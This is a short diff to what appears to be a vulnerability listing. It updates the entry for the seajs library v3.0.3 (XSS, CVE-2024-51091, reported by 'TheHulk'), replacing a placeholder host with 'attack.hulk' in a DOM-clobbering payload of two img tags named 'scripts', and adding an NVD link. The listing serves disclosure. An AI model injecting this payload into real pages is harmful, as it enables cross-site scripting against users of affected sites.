@@ -5,9 +5,9 @@
 + Library: seajs
 + Stars: 8.3K
 + Version: v3.0.3
-+ Payload: ```<img name="scripts" src="https://xxx.xxx.xxx"><img name="scripts" src="https://xxx.xxx.xxx">```
++ Payload: ```<img name="scripts" src="https://attack.hulk"><img name="scripts" src="https://attack.hulk">```
 + Impact: XSS
-+ CVE: CVE-2024-51091
++ CVE: [CVE-2024-51091](https://nvd.nist.gov/vuln/detail/CVE-2024-51091)
 + Status: Reported
 + Foundby: TheHulk
 
